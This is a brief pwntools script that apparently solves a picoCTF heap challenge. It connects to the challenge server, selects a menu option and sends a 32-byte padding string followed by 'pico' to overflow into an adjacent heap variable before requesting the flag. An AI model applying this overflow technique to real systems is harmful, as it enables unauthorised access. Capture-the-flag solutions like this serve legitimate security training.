#Basic bof, but in heap environment, the given address offset's gonna always be 32
#This is basically the same as heap 0, idk what's the difference
from pwn import *

p = remote('tethys.picoctf.net',59721)
p.sendlineafter(b'choice:',b'2')
p.sendlineafter(b'buffer:',b'A'*32+b'pico')
p.sendlineafter(b'choice:',b'4')

p.interactive()
